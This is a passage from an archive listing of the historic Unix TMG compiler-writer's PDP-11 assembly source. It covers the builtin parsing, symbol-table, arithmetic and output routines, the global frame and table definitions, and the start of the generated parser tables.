
/ infix =
.st:
	jsr	pc,sprv
	mov	(sp)+,(sp)
	mov	(sp)+,(sp)
/ update
.u:
	jsr	pc,update
	br	9f
/ pop stack
.p:
	jsr	pc,sprv
	cmp	(sp)+,(sp)+
	br	9f
/ test stack
.t:
	jsr	pc,sprv
	mov	(sp)+,(sp)+
	bne	9f
	jmp	fail
/ load named value
/ rvalue into (sp), lvalue into 2(sp)
.l:
	jsr	pc,iget
	mov	r0,-(sp)
	mov	(r0),-(sp)
	br	9f
/ update a stored value, used by all assignments
update:
	cmp	2+2(sp),$-1
	beq	1f
	mov	0+2(sp),*2+2(sp)
	rts	pc
1:
	mov	4+2(sp),r1
	mov	6+2(sp),r0
	jsr	pc,seekchar
	mov	0+2(sp),r0
	jsr	pc,alterword
/ make sp hold a simple rv (forget it might be a table value)
sprv:
	mov	(sp)+,r0
	cmp	$-1,2(sp)
	bne	1f
	mov	(sp)+,(sp)
	mov	(sp)+,(sp)
1:
	mov	r0,pc
9:
	jmp	succ

-- /usr/source/tmg/tmgb/bundle.s mode=0100664 uid=3 gid=3 atime=174924489 mtime=169260961 --
f = r5
g = r4
.globl g1
.globl pbundle,iget
.globl succ
.globl bundle,reduce

reduce:
	jsr	pc,iget
	mov	(r0),r1
	mov	g,r0
	asl	r1
	sub	r1,r0
	br	1f
	br	1f
bundle:
	mov	f,r0
	add	$g1,r0
1:
	jsr	pc,pbundle
	tst	r0
	beq	1f
	mov	r0,(g)+
1:
	jmp	succ
-- /usr/source/tmg/tmgb/char.s mode=0100664 uid=3 gid=3 atime=174924491 mtime=169260961 --
f = r5
i = r3
.globl j
.globl jget,iget
.globl char
.globl succ,fail

char:
	jsr	pc,jget
	bne	1f
	tst	(i)+
	jmp fail
1:
	mov	r0,-(sp)
	jsr	pc,iget
	mov	(sp)+,(r0)
	inc	j(f)
	jmp	succ
-- /usr/source/tmg/tmgb/copy.s mode=0100664 uid=3 gid=3 atime=174924493 mtime=169260961 --
f = r5
i = r3
.globl x,k
.globl ktab,ktat
.globl putcall,obuild
.globl errcom,succ,generate
.globl rewcstr,getcstr
.globl scopy

scopy:
	mov	$2f+1,r0
	jsr	pc,putcall
	jsr	pc,rewcstr
	mov	k(f),r2
	neg	r2
	add	$2,r2
1:
	jsr	pc,getcstr
	tst	r0
	beq	1f
	movb	r0,ktab(r2)
	inc	r2
	cmp	r2,$ktat
	blt	1b
	jsr	r0,errcom
	<translation overflow\0>;.even
1:
	clrb	ktab(r2)
	bic	$1,r2
	neg	r2
	mov	r2,k(f)
	jmp	succ
2:
	mov	i,r0
	jsr	pc,obuild
	jmp	generate
-- /usr/source/tmg/tmgb/cstr.s mode=0100664 uid=3 gid=3 atime=174924495 mtime=169260962 --
.globl jget,iget
.globl succ
.globl create,rewind,putchar,getchar,allocate
.globl smark
.globl rewcstr,putcstr,getcstr,size

/ currnet string manipulations
/ keep a initial fragment handy for quick access
/go to allocator for the rest

smark:
	jsr	pc,jget
	clr	cstrw
	jmp	succ

rewcstr:
	clr	cstrr
	rts	pc

putcstr:
	mov	cstrw,r1
	inc	cstrw
	cmp	r1,$cstrt	/is it quick access?
	bge	1f
	movb	r0,cstrb(r1)	/yes, stash the char
	rts	pc
1:
	bne	1f
	mov	r0,-(sp)	/first char to allocator
	mov	symp,r1
	bne	2f
	mov	$64,r0
	jsr	pc,allocate
	mov	r1,symp
2:
	jsr	pc,create
	mov	(sp)+,r0
1:
	mov	symp,r1
	jsr	pc,putchar
	rts	pc

getcstr:
	mov	cstrr,r1
	cmp	r1,cstrw
	blt	1f
	clr	r0	/end of string
	rts	pc
1:
	inc	cstrr
	cmp	r1,$cstrt
	bge	1f
	movb	cstrb(r1),r0
	rts	pc
1:
	bne	1f
	mov	symp,r1
	jsr	pc,rewind
1:
	mov	symp,r1
	jsr	pc,getchar
	rts	pc

size:
	jsr	pc,iget
	mov	cstrw,(r0)
	jmp	succ

cstrt = 16		/top of quick access current string
.data
symp:	0	/pointer to dynamicallly allocated current string
cstrw:	0	/current string write pointer
.bss
cstrr:	.=.+2	/read pointer
cstrb:	.=.+cstrt	/base of quick access fragment
-- /usr/source/tmg/tmgb/ctest.s mode=0100664 uid=3 gid=3 atime=174924497 mtime=169260962 --
f = r5
.globl j
.globl classtab,jget
.globl ctest
.globl putcstr
.globl succ

ctest:
	inc	ctestc
	mov	r0,-(sp)
	jsr	pc,jget
	asl	r0
	bit	*(sp)+,classtab(r0)
	clc
	beq	1f
	asr	r0
	jsr	pc,putcstr
	inc	j(f)
	sec
1:
	rts	pc

.data
ctestc:	0
-- /usr/source/tmg/tmgb/decmal.s mode=0100664 uid=3 gid=3 atime=174924499 mtime=169260962 --
i = r3
.globl putcall,iget,kput,putdec
.globl generate,succ
.globl decimal

decimal:
	mov	$1f+1,r0
	jsr	pc,putcall
	jsr	pc,iget
	mov	(r0),r0
	jsr	pc,kput
	jmp	succ
1:
	mov	(i),r0
	jsr	pc,putdec
	jmp	generate
-- /usr/source/tmg/tmgb/discd.s mode=0100664 uid=3 gid=3 atime=174924501 mtime=169260962 --
.globl release
.globl discard
.globl iget,succ

discard:
	jsr	pc,iget
	mov	(r0),r1
	jsr	pc,release
	jmp	succ
-- /usr/source/tmg/tmgb/emit.s mode=0100664 uid=3 gid=3 atime=174924503 mtime=169260962 --
f=r5
g=r4
.globl ofile
.globl dogen
.globl succ
.globl g1,k
.globl emit

emit:
	mov	f,-(sp)
	add	$g1,(sp)
	mov	g,r1
1:			/look for a translation
	cmp	(sp),r1
	bge	3f	/none at all
	bit	-(r1),$100001	
	beq	1b
			/move it to end of stak
	mov	(r1)+,r0
1:
	cmp	g,r1
	ble	1f
	mov	(r1),-2(r1)
	mov	r0,(r1)+
	br	1b
1:
	mov	ofile,r0
	jsr	pc,dogen
	mov	g,r1
1:
	cmp	(sp),r1	/try to find prev value of k
	bge	1f	/nothing more in this stack frame
	tst	-(r1)
	bge	1b	/this isnt a k pointer (negative)
	mov	(r1),k(f)
	br	3f
1:
	mov	f,r0	/go back to prev stack frame
	mov	k(r0),k(f)
3:
	tst	(sp)+
	jmp	succ
-- /usr/source/tmg/tmgb/end.s mode=0100664 uid=3 gid=3 atime=174924505 mtime=169260962 --
.globl end
/ the driving tables ended just before here
end:
-- /usr/source/tmg/tmgb/f.s mode=0100664 uid=3 gid=3 atime=174924507 mtime=169260962 --
.globl .f
.globl succ
.globl seekchar,getword

.f:
	mov	(sp),r0
	mov	r0,6(sp)
	mov	4(sp),r1
	jsr	pc,seekchar
	jsr	pc,getword
	mov	r0,(sp)
	mov	$-1,2(sp)
	jmp	succ
-- /usr/source/tmg/tmgb/find.s mode=0100664 uid=3 gid=3 atime=174924509 mtime=169260962 --
i=r3
.globl lptr,rptr,sptr
.globl succ,fail
.globl iget
.globl find,enter
.globl seekchar,getword,getchar
.globl putword,putchar,alterword
.globl getcstr,rewcstr
.globl length,rewind

index=0
tablep=2
temp=4
which=6
framel=10

find:
	mov	pc,-(sp)	/which(sp)
	br	1f
enter:
	clr	-(sp)
1:
	jsr	pc,rewcstr
	jsr	pc,getcstr
	bne	1f
	tst	(sp)+
	jmp	fail
1:
	clr	-(sp)	/temp(sp)
	jsr	pc,iget
	mov	(r0),-(sp)	/tablep(sp)
	clr	-(sp)	/index(sp)

right:
	add	$rptr,index(sp)
	br	1f
left:
	add	$lptr,index(sp)
1:			/get index of next entry
	mov	tablep(sp),r1
	mov	index(sp),r0
	jsr	pc,seekchar
	jsr	pc,getword
	tst	r0
	beq	nomore
	mov	r0,index(sp)
	add	$sptr,r0
	jsr	pc,seekchar
	jsr	pc,rewcstr
1:			/comparison loop
	mov	tablep(sp),r1
	jsr	pc,getchar
	mov	r0,-(sp)
	jsr	pc,getcstr
	cmp	r0,(sp)+
	bgt	right
	blt	left
	tst	r0
	beq	found
	br	1b

nomore:		/not in table
	tst	which(sp)
	beq	1f
	tst	(i)+	/exit from find
	add	$framel,sp
	jmp	fail
1:
	mov	tablep(sp),r1
	jsr	pc,length
	mov	r0,temp(sp)
	clr	r0
	jsr	pc,putword	/scratch word
	jsr	pc,putword	/left pointer
	jsr	pc,putword	/right
	mov	index(sp),r0
	jsr	pc,seekchar
	mov	temp(sp),r0
	mov	r0,index(sp)
	jsr	pc,alterword
	jsr	pc,rewcstr
1:			/copy loop
	jsr	pc,getcstr
	mov	tablep(sp),r1
	jsr	pc,putchar
	tst	r0
	bne	1b

found:
	jsr	pc,iget
	mov	index(sp),(r0)
	add	$framel,sp
	jmp	succ
-- /usr/source/tmg/tmgb/getnam.s mode=0100664 uid=3 gid=3 atime=174924511 mtime=169260962 --
i = r3
.globl putcall,kput,obuild
.globl seekchar
.globl  getchar
.globl	outb, outw, outt
.globl	cfile, lfile, flush
.globl iget
.globl sptr
.globl generate,succ
.globl getnam

getnam:
	mov	$1f+1,r0
	jsr	pc,putcall
	jsr	pc,iget
	mov	(r0),r0
	jsr	pc,kput
	jsr	pc,iget
	mov	(r0),r0
	jsr	pc,kput
	jmp	succ
1:
	cmp	cfile,lfile
	beq	1f
	jsr	pc,flush
	mov	cfile,lfile
1:
	mov	(i)+,r1
	mov	r1,-(sp)
	mov	(i)+,r0
	add	$sptr,r0
	jsr	pc,seekchar
2:
	mov	(sp),r1
	mov	outw,r2
1:
	jsr	pc,getchar
	tst	r0
	beq	1f
	movb	r0,outb(r2)
	inc	r2
	mov	r2,outw
	cmp	r2,$outt
	blt	1b
/
	jsr	pc,flush
	br	2b
1:
	tst	(sp)+
	jmp	generate
-- /usr/source/tmg/tmgb/ignore.s mode=0100664 uid=3 gid=3 atime=174924513 mtime=169260962 --
f = r5
.globl n
.globl	succ,iget
.globl ignore

ignore:
	jsr	pc,iget
	mov	(r0),n(f)
	jmp	succ
-- /usr/source/tmg/tmgb/inc.s mode=0100664 uid=3 gid=3 atime=174924515 mtime=169260962 --
.globl succ,.u,update
.globl .ia,.ib,.da,.db

/prefix ++
.ib:
	inc	(sp)
	jmp	.u
/prefix --
.db:
	dec	(sp)
	jmp	.u
/postfix++
.ia:
	inc	(sp)
	jsr	pc,update
	dec	(sp)
	jmp	succ
/potsfix --
.da:
	dec	(sp)
	jsr	pc,update
	inc	(sp)
	jmp	succ

-- /usr/source/tmg/tmgb/infix.s mode=0100664 uid=3 gid=3 atime=174924517 mtime=169260962 --
.globl .p,sprv
.globl .a,.s,.o,.n,.x

/ +
.a:
	jsr	pc,sprv
	add	(sp),4(sp)
	br	9f

/ -
.s:
	jsr	pc,sprv
	sub	(sp),4(sp)
	br	9f

/ |
.o:
	jsr	pc,sprv
	bis	(sp),4(sp)
	br	9f

/ &
.n:
	jsr	pc,sprv
	com	(sp)
	bic	(sp),4(sp)
	br	9f

/ ^ exclusive or
.x:
	jsr	pc,sprv
	mov	(sp),r0
	xor	r0,4(sp)
9:
	jmp	.p
-- /usr/source/tmg/tmgb/jget.s mode=0100664 uid=3 gid=3 atime=174924519 mtime=169260962 --
f = r5
.globl j,n
.globl input
.globl classtab
.globl jget

jget:
	inc	jgetc
3:
	mov	j(f),r1
	mov	r1,r0
	bic	$inpt-1,r0
	bic	r0,r1
	cmp	r0,inpr
	beq	1f
	inc	readc
	mov	r0,inpr
	mov	input,r0
	sys	seek
inpr:		1;0
	sys	read;inpb;inpt
2:
	cmp	r0,$inpt
	bge	1f
	clrb	inpb(r0)
	inc	r0
	br	2b
1:
	movb	inpb(r1),r0
	asl	r0
	bit	n(f),classtab(r0)
	beq	1f
	inc	j(f)
	inc	r1
	cmp	r1,$inpt
	blt	1b
	br	3b
1:
	asr	r0
	rts	pc
inpt = 128.
.bss
inpb:	. = .+inpt
.data
jgetc:	0
readc:	0
-- /usr/source/tmg/tmgb/lvrv.s mode=0100664 uid=3 gid=3 atime=174924521 mtime=169260962 --
.globl .lv,.rv
.globl succ

/ unary &

.lv:
	mov	2(sp),(sp)
	jmp	succ

/ *

.rv:
	mov	(sp),2(sp)
	mov	*2(sp),(sp)
	jmp	succ
-- /usr/source/tmg/tmgb/mult.s mode=0100664 uid=3 gid=3 atime=174924523 mtime=169260962 --
.globl .m,.q,.r
.globl .p,sprv

.m:
	jsr	pc,sprv
	mov	(sp),r0
	mpy	4(sp),r0
	mov	r1,4(sp)
	br	1f

.q:
	jsr	pc,sprv
	mov	4(sp),r1
	sxt	r0
	dvd	(sp),r0
	mov	r0,4(sp)
	br	1f

.r:
	jsr	pc,sprv
	mov	4(sp),r1
	sxt	r0
	dvd	(sp),r0
	mov	r1,4(sp)
1:
	jmp	.p
-- /usr/source/tmg/tmgb/octal.s mode=0100664 uid=3 gid=3 atime=174924525 mtime=169260962 --
i = r3
.globl putcall,iget,kput,putoct
.globl generate,succ
.globl octal

octal:
	mov	$1f+1,r0
	jsr	pc,putcall
	jsr	pc,iget
	mov	(r0),r0
	jsr	pc,kput
	jmp	succ
1:
	mov	(i),r0
	jsr	pc,putoct
	jmp	generate
-- /usr/source/tmg/tmgb/params.s mode=0100664 uid=3 gid=3 atime=174924527 mtime=169260962 --
f = r5
.globl iget
.globl env,si
.globl succ
.globl params

params:
	jsr	pc,iget
	mov	(r0),r0
	asl	r0
	mov	env(f),r1
	add	r0,si(r1)
	jmp	succ
-- /usr/source/tmg/tmgb/push.s mode=0100664 uid=3 gid=3 atime=174924529 mtime=169260962 --
.globl succ
.globl iget
.globl push

push:
	jsr	pc,iget
	mov	(r0),r2
	mov	r2,r1
1:
	mov	r1,-(sp)
	jsr	pc,iget
	mov	(sp)+,r1
	mov	r0,-(sp)
	mov	(r0),-(sp)
	dec	r2
	bgt	1b
	mov	r1,-(sp)
	jsr	pc,succ
/			preserve c bit from here on
	mov	(sp)+,r2
1:
	mov	(sp)+,*(sp)+
	dec	r2
	bgt	1b
	rts	pc	/pass sret or fret back to invoking rule
-- /usr/source/tmg/tmgb/putcal.s mode=0100664 uid=3 gid=3 atime=174924531 mtime=169260962 --
f = r5
g = r4
.globl k
.globl errcom
.globl ktab,ktat
.globl putcall,kput

putcall:
	jsr	pc,kput
	mov k(f),(g)+
	rts	pc

kput:
	sub	$2,k(f)
	mov	k(f),r1
	neg	r1
	mov	r0,ktab(r1)
	cmp	r1,$ktat
	bhis	1f
	rts	pc
1:
	jsr	r0,errcom
		<translation overflow\0>;.even
-- /usr/source/tmg/tmgb/putdec.s mode=0100664 uid=3 gid=3 atime=174924533 mtime=169260962 --
.globl putch,obuild
.globl putdec

putdec:
	tst	r0
	bge	1f
	cmp	r0,$100000
	beq	2f
	mov	r0,-(sp)
	mov	$'-,r0
	jsr	pc,putch
	mov	(sp)+,r0
	neg	r0
1:
	alsc	$-16.,r0
	dvd	$10.,r0
	beq	1f
	mov	r1,-(sp)
	jsr	pc,1b
	mov	(sp)+,r1
1:
	mov	r1,r0
	add	$'0,r0
	jmp	putch
2:
	mov	$1f,r0
	jmp	obuild
1:
		<-32768\0>;.even
-- /usr/source/tmg/tmgb/putoct.s mode=0100664 uid=3 gid=3 atime=174924535 mtime=169260962 --
.globl putch,obuild
.globl putoct


putoct:	mov	r0,-(sp)
	bic	$7,r0
	bic	r0,(sp)
	clc
	ror	r0
	ror	r0
	ror	r0
	beq	1f
	jsr	pc,putoct
1:
	mov	(sp)+,r0
	add	$'0,r0
	jsr	pc,putch
	rts	pc
-- /usr/source/tmg/tmgb/px.s mode=0100664 uid=3 gid=3 atime=174924537 mtime=169260962 --
f = r5
i = r3
.globl j,n
.globl iget,jget
.globl succ,fail
.globl .px,.pxs

.pxs:
	mov	i,r0
	tst	(i)+
	br	1f
.px:
	jsr	pc,iget
1:
	inc	litc
	mov	n(f),-(sp)
	mov	j(f),-(sp)
	mov	r0,-(sp)
2:
	tstb	*(sp)
	beq	2f
	jsr	pc,jget
	cmpb	r0,*(sp)
	beq	1f
	tst	(sp)+
	mov	(sp)+,j(f)
	mov	(sp)+,n(f)
	jmp	fail
1:
	clr	n(f)
	inc	(sp)
	inc	j(f)
	br 	2b
2:
	cmp	(sp)+,(sp)+
	mov	(sp)+,n(f)
	jmp	succ
litc:	0
-- /usr/source/tmg/tmgb/reln.s mode=0100664 uid=3 gid=3 atime=174924539 mtime=169260962 --
.globl .p,sprv
.globl .eq,.ne,.lt,.le,.gt,.ge

.eq:
	jsr	pc,sprv
	cmp	4(sp),(sp)
	beq	true
	br	false

.ne:
	jsr	pc,sprv
	cmp	4(sp),(sp)
	bne	true
	br	false
.lt:
	jsr	pc,sprv
	cmp	4(sp),(sp)
	blt	true
	br	false

.le:
	jsr	pc,sprv
	cmp	4(sp),(sp)
	ble	true
	br	false

.gt:
	jsr	pc,sprv
	cmp	4(sp),(sp)
	bgt	true
	br	false

.ge:
	jsr	pc,sprv
	cmp	4(sp),(sp)
	bge	true
	br	false

true:
	mov	$1,4(sp)
	jmp	.p

false:
	clr	4(sp)
	jmp	.p
-- /usr/source/tmg/tmgb/shift.s mode=0100664 uid=3 gid=3 atime=174924541 mtime=169260963 --
.globl .p,sprv
.globl .sr,.sl

/ >>
.sr:
	neg	(sp)

/ <<
.sl:
	mov	4(sp),r1
	clr	r0
	alsc	(sp),r0
	mov	r1,4(sp)
	jmp	.p
-- /usr/source/tmg/tmgb/stack.s mode=0100664 uid=3 gid=3 atime=174924543 mtime=169260963 --
/ builtins for shift-reduce parsking
f = r5
i = r3
g = r4
.globl succ,pbundle,goto,iget
.globl g1
.globl stack,unstack,gotab,accept

/stack label of present rule (state)
/should come first in a rule

stack:
	mov	i,(g)
	sub	$2,(g)+
	jmp	succ

/unstack(n) deletes last n stacked states
/states are distinguishable from translations in not having
/an exit bit ($1) nor being bundles ($100000)
unstack:
	jsr	pc,iget
	mov	(r0),r0
	mov	g,r1
1:
	bit	-(r1),$100001
	bne	1b
	dec	r0
	bge	1b
	tst	(r1)+
	br	1f

accept:			/clean out all states from stack
	mov	f,r1
	add	$g1,r1
1:
	mov	r1,r0
	mov	r1,-(sp)
1:
	cmp	r1,g
	bge	2f
	bit	(r1)+,$100001
	beq	1b
	mov	-2(r1),(r0)+
	br	1b
2:
	mov	r0,g
	mov	(sp)+,r0
	jsr	pc,pbundle
	tst	r0
	beq	1f
	mov	r0,(g)+
1:
	jmp	succ

/gotab(s1,t1,s2,t2,...sn,tn,0,t)
/checks top of stack for states
/s1,s2,... and goes to t1, t2 accordingly
/if top of stack is not in table, goes to t

gotab:
	mov	g,r0
1:
	bit	-(r0),$100001	/find top state
	bne	1b
	mov	(r0),-(sp)
1:
	jsr	pc,iget
	tst	(r0)
	beq	1f
	cmp	(sp),r0
	beq	1f
	jsr	pc,iget
	br	1b
1:
	tst	(sp)+
	jmp	goto
-- /usr/source/tmg/tmgb/string.s mode=0100664 uid=3 gid=3 atime=174924545 mtime=169260963 --
f = r5
i = r3
.globl j
.globl succ
.globl ctest,iget
.globl string

string:
	tst	-(sp)
	jsr	pc,iget
1:
	mov	j(f),(sp)
	mov	r0,-(sp)
	jsr	pc,ctest
	mov	(sp)+,r0
	bcs	1b
	mov	(sp)+,j(f)
	jmp	succ
-- /usr/source/tmg/tmgb/table.s mode=0100664 uid=3 gid=3 atime=174924547 mtime=169260963 --
.globl allocate,putword,putchar
.globl iget
.globl succ
.globl table

table:
	mov	$10,r0
	jsr	pc,allocate
	mov	r1,-(sp)
	clr	r0
	jsr	pc,putword
	jsr	pc,putword
	jsr	pc,putword
	jsr	pc,putchar
	jsr	pc,iget
	mov	(sp)+,(r0)
	jmp	succ
-- /usr/source/tmg/tmgb/tq.s mode=0100664 uid=3 gid=3 atime=174924549 mtime=169260963 --
f = r5
i = r3
.globl ek,ep,ek.fs,ep.fs,si,x,fs
.globl generate
.globl .tq,gpar

.tq:
	mov	(i)+,r0
	mov	i,si(f)
	mov	ep(f),r1
	mov	ep(r1),ep.fs(f)
	mov	ek(r1),ek.fs(f)
	mov	si(r1),r1
	asl	r0
	sub	r0,r1
	mov	(r1),i
	add	$fs,f
	clr	x(f)
	jsr	pc,generate
	jmp	generate

gpar:
	mov	(i)+,r0
	mov	ep(f),r1
	asl	r0
	add	r0,si(r1)
	jmp	generate
.globl gq;gq=.tq
-- /usr/source/tmg/tmgb/trace.s mode=0100664 uid=3 gid=3 atime=174924551 mtime=169260963 --
i = r3
.globl putch,putoct
.globl trswitch
.globl trace

trace:
	jsr	pc,putch
	mov	i,r0
	jsr	pc,putoct
	mov	$'\n,r0
	jsr	pc,putch
	rts	pc
.data
trswitch:	0
-- /usr/source/tmg/tmgb/trans.s mode=0100664 uid=3 gid=3 atime=174924553 mtime=169260963 --
g = r4
.globl succ,iget
.globl trans

trans:
	jsr	pc,iget
	mov	r0,(g)+
	jmp	succ
-- /usr/source/tmg/tmgb/tx.s mode=0100664 uid=3 gid=3 atime=174924555 mtime=169260963 --
i = r3
.globl generate
.globl obuild
.globl .tx,.txs

.txs:
	mov	i,r0
	tst	(i)+
	br	1f
.tx:
	mov	(i)+,r0
1:
	jsr	pc,obuild
	jmp	generate
-- /usr/source/tmg/tmgb/unary.s mode=0100664 uid=3 gid=3 atime=174924557 mtime=169260963 --
.globl succ
.globl .ng,.nt,.cm

/ !

.nt:
	tst	(sp)
	beq	1f
	clr	(sp)
	br	9f
1:
	mov	$1,(sp)
	br	9f

/unary -

.ng:
	neg	(sp)
	br	9f

/ ~

.cm:
	com	(sp)

9:
	jmp	succ
-- /usr/source/tmg/tmgc.s mode=0100664 uid=3 gid=3 atime=174924480 mtime=169260948 --
/ tmg tables and global definitions

/ in addition to these definitions each routine
/ follows the convention
/ f = stack frame pointer during parse and translation
/ g = stack frame end during parse
/ i = interprested instruction counter during parse and translation

.globl tables
.globl x,si,j,k,n,g1,env
.globl ek,ek.fs,ep,ep.fs,fs
.globl lptr,sptr,rptr
.globl outb,outt,outw
.globl stkt,stkb,stke
.globl ktat,ktab
.globl input,cfile,lfile,dfile,ofile

/ parse stack frame layout
/ 0 is previous frame pointer
/ return address in (sp)
x = 2.	/exit bit, nonzero at end of rule
si = 4.	/ save location for instruction counter
j = 6.	/ input cursor counts characters
k = 8.	/ ktable water mark, last use location relative to base
n = 10.	/address of ignored character class
env = 12.	/ frame pointer for static environment
g1 = 14.	/ frame length during parse

/symbol table entry layout
/word 0 is for customer
lptr=2.	/index of next entry on tree to left
rptr=4.	/index of next entry to right
sptr=6.	/first character of string in this entry
		/next char is in 7, etc

/ translation frame layout
/ used as ek(f), ep(f), etc
/ x and si have same meaning as in parse stack frame
/ return address in (sp)
ek = 0	/ k environment, frame where bunlde address is in si
ep = 6	/ p environment, frame where si points to parameter list
fs = 10	/ frame size
ek.fs = ek+fs	/ k environment in next frame
ep.fs = ep+fs	/ p env in next frame

.data

tables = . 	/marks break between routines and tables

outt = 64.	/ output buffer top
stkt = 800.	/stack top for (f), not for (sp)
ktat = 1200.	/ k table top


input: -1	/ stream number of input
cfile: 1	/ stream number of current output
lfile: 1	/ last current output
dfile: 2	/ diagnostic file
ofile: 1	/output file


outw: 0	/ output write pointer, number of chars in buffer
.bss
outb: .=.+outt	/output buffer



ktab: . = .+ktat	/ contains translation rules that have been bundled

stkb: . = .+stkt	/ stack, (f) ponts into this
stke = .	/stack end
-- /usr/source/tmg/tmgl.s mode=0110664 uid=3 gid=3 atime=174924587 mtime=174924587 --
1 ..1
..1:begin:

ignore
blanks
pr1:
comment
salt;pr1
parse
first
salt;pr2
diag
error
pr2:
comment
salt;pr2
parse
line
salt;pr2
diag
error
salt;pr2
putcharcl
1 parse
last
.3=.
<1 \0>;.even
.2=.
.tx;.3
.tp;.byte 1,0;
1 .tn
.1=.
fref
1 trans;1 .2
.4=.
.tp;.byte 2,0;
.txs;':
1 .tp;.byte 1,0;
first:

parse
.1
getfref
line
1 trans;1 .4
.1=.
1
.2=.
2
.3=.
1 .txs;';
.5=.
<??? \0>;.even
.4=.
.tn
.tx;.5
.tp;.byte 2,0;
.tp;.byte 1,0;
1 .tn
error:

smark
ignore
none
any
.1
string
.2
scopy
.pxs;';
alt;..3
trans;1 .3
goto;..2
..3:null
..2:
1 trans;1 .4
.1=.
.tp;.byte 2,0;
.tn
.tp;.byte 1,0;
1 .tn
line:

labels
charcl
alt;..7
.pxs;';
goto;..4
..7:statement
salt;..5
numbers
salt;..6
trule
.pxs;';
..6:
..5:
..4:
1 trans;1 .1
.1=.
.tp;.byte 2,0;
.tn
1 .tp;.byte 1,0;
numbers:

number
.pxs;';
numbers
alt;done
1 trans;1 .1
.1=.
.tp;.byte 2,0;
.tn
1 .tp;.byte 1,0;
labels:

label
labels
alt;done
1 trans;1 .1
.1=.
.tp;.byte 1,0;
1 .txs;':
label:

name
.pxs;':
1 trans;1 .1
.2=.
<.pn:1 .pxs;12\0>;.even
.3=.
<.tn:1 .txs;12\0>;.even
.1=.
.tx;.2
.tn
.tx;.3
1 .tn
last:

1 trans;1 .1
.1=.
</*\0>;.even
.2=.
4
comment:

.px;.1
co1:
ignore
.2
.pxs;'*
ignore
none
.pxs;'/
1 alt;co1
.1=.
0
.2=.
gpar;1
.tp;.byte 2,0;
1 .tp;.byte 1,0;
.3=.
gpar;1
1 generate
.4=.
gpar;1
.tp;.byte 2,0;nil
.tn
1 .tp;.byte 1,0;q1
.5=.
1 .tp;.byte 1,0;xbit
.7=.
<1 succ\0>;.even
.6=.
.tp;.byte 1,0;nil
.tn
1 .tx;.7
statement:

.l;csym
.l;.1
.st
.p
oldtab
dtt
oldtab
pat
proc
alt;..11
plst
tlst
.pxs;')
trans;1 .2
goto;..10
..11:trans;1 .3
noelem
..10:
stt1:
bundle
frag
alt;..15
trans;1 .4
salt;stt1
goto;..12
..15:.pxs;';
ifelem
alt;..14
trans;1 .5
goto;..13
..14:trans;1 .6
..13:
..12:
1 succ
.1=.
<proc(\0>;.even
proc:

smark
ignore
none
1 .px;.1
.1=.
1 octal
npa
.3=.
<params;\0>;.even
.2=.
.tx;.3
.tp;.byte 1,0;
1 .tn
plst:

list
pident
alt;null
remote
.1
1 trans;1 .2
pident:

ident
1 newtab
pat
npa
.1=.
0
.2=.
name
.l;i
.ia
1 .p
.3=.
1 octal
i
.5=.
<push;\0>;.even
.4=.
.tx;.5
.tp;.byte 1,0;
.tn
.tp;.byte 2,0;
1 .tn
tlst:

.pxs;';
alt;null
.l;i
.l;.1
.st
.p
list
.2
remote
.3
1 trans;1 .4
.1=.
gpar;1
1 .tp;.byte 1,0;nil
q1
.2=.
gpar;1
1 .tp;.byte 1,0;
frag:

prule
alt;..17
trans;1 .1
goto;..16
..17:labels
noelem
trans;1 .2
..16:
1 succ
.2=.
<salt;\0>;.even
.1=.
gpar;2
.tp;.byte 3,0;nil
nil
.tn
.tx;.2
.tp;.byte 2,0;
.tn
.tp;.byte 1,0;q2
q1
.tn
.tp;.byte 2,0;
1 .txs;':
.5=.
<alt;\0>;.even
.4=.
.tn
.tx;.5
1 .tp;.byte 1,0;
.6=.
<goto;\0>;.even
.3=.
gpar;2
.tp;.byte 4,0;.4
q1
.tn
.tx;.6
.tp;.byte 3,0;
.tn
.tp;.byte 1,0;
.txs;':
.tp;.byte 2,0;q2
q1
.tn
.tp;.byte 3,0;
1 .txs;':
prule:

.l;sndt
.l;ndt
.st
.p
disj
.pxs;'|
alt;..23
.l;ndt
.l;sndt
.st
.p
fref
ifeasy
alt;..21
prule
trans;1 .1
goto;..20
..21:prule
fref
trans;1 .3
..20:
noelem
goto;..22
..23:
..22:
1 succ
.1=.
gpar;2
.tp;.byte 2,0;q2
nil
.tn
1 .tp;.byte 1,0;nil
q1
disj:

pelem
pdot
disj
alt;..25
trans;1 .1
ifelem
alt;done
ishard
goto;..24
..25:
..24:
1 succ
.1=.
gpar;2
.tp;.byte 1,0;q1
1 .tq;2
.2=.
1
.3=.
gpar;2
1 generate
pelem:

pprim
alt;..31
trans;1 .1
iseasy
goto;..26
..31:.pxs;'(
push
.2
sndt
prule
alt;..30
.pxs;')
goto;..27
..30:.pxs;')
trans;1 .3
noelem
..27:
..26:
1 succ
.1=.
gpar;1
.tq;1
.tp;.byte 2,0;
.tn
1 .tp;.byte 1,0;
.2=.
gpar;1
.tq;1
1 .tp;.byte 1,0;
.4=.
<alt;\0>;.even
.3=.
1 .tx;.4
.5=.
<\\\0>;.even
.7=.
<salt;\0>;.even
.6=.
1 .tx;.7
.10=.
gpar;1
.tp;.byte 3,0;nil
.tn
.tq;1
.tp;.byte 2,0;
1 .tp;.byte 1,0;
pprim:

special
salt;..32
rname
.pxs;':
alt;..37
fail
goto;..33
..37:spdot
salt;..34

..34:
ignore
none
.pxs;'(
alt;..36
ignore
blanks
list
parg
.pxs;')
trans;1 .1
goto;..35
..36:trans;1 .2
..35:
..33:
..32:
.pxs;'/
alt;..41
trans;1 .3
goto;..40
..41:.px;.5
alt;..43
trans;1 .6
..40:
rname
trans;1 .10
goto;..42
..43:
..42:
1 succ
.2=.
0
pdot:

.pxs;'.
alt;done
ignore
none
ident
salt;alias
.l;dtt
.t
salt;..44
table
dtt
.l;ndt
.l;.2
.st
.p
..44:
.l;ndt
.ia
1 .p
.1=.
1 any
letter
spdot:

.pxs;'.
ignore
none
not
.1
alias:
1 newtab
dtt
ndt
parg:

rname
salt;..45
remote
specparg
..45:
1 succ
.2=.
<\\n\\0\0>;.even
.1=.
1 .tx;.2
.4=.
<1 succ\0>;.even
.3=.
1 .tx;.4
.5=.
3
.6=.
0
.7=.
1 .tp;.byte 1,0;nil
xbit
.11=.
<1 succ\0>;.even
.10=.
.tp;.byte 1,0;nil
nil
.tn
1 .tx;.11
specparg:

number
salt;..46
charcl
salt;..47
.pxs;'<
alt;..57
longlit
goto;..50
..57:.pxs;'*
alt;..56
trans;1 .1
goto;..51
..56:.pxs;'(
.pxs;')
alt;..55
trans;1 .3
goto;..52
..55:push
.5
dtt
ndt
sndt
.l;dtt
.l;.6
.st
.p
prule
.pxs;')
oldtab
